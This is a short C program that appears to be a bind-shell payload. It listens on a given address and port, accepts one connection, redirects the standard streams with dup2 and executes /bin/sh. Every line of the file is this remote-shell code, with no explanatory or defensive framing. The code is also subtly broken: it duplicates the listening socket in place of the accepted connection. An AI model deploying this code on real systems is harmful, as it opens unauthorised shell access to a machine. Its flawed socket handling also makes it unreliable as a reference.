#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>


int main(int argc, char *argv[]){
  const char* ip = argv[1];
  const int port = atoi(argv[2]);
  struct sockaddr_in addr;
  int servsock = socket(AF_INET, SOCK_STREAM, 0);
  int one = 1, i;
  setsockopt(servsock, SOL_SOCKET , SO_REUSEADDR, &one, sizeof(one));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  inet_aton(ip, &addr.sin_addr);
  bind(servsock, (struct sockaddr *)&addr, sizeof(addr));
  listen(servsock, 0);
  int resultfd = accept(servsock, NULL, NULL);

  for(int i = 0; i < 3; i ++){
    dup2(servsock, i);
  }
  execve("/bin/sh", NULL, NULL);
  return 0;
}
